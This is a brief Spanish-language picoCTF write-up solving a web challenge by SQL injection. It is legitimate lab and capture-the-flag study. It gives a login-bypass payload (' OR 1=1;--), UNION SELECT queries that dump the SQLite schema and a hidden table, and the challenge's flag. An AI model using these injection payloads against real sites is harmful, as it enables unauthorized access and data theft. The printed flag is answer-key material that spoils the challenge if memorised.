
## DESCRIPCION
- Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:53122/).
## SOLUCION
```
Se coloca ' OR 1=1;-- en paswword porque primero revisa eso
luego 
```
![[Pasted image 20260914230358.png|375]]
```
se pone ' UNION SELECT sql, name, NULL FROM sqlite_master;-- en city
```
![[Pasted image 20260914230559.png|316]]
![[Pasted image 20260914230736.png]]

```
' UNION SELECT flag, NULL, NULL FROM more_table;--
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```
## NOTAS ADICIONALES
- Secuestre el buscador utilizando el comando `UNION` para adjuntar una consulta secreta que imitaba el número de columnas de la tabla original, obligando así a la base de datos a revelarte la bandera oculta.

## REFERENCIAS
- Gemini IA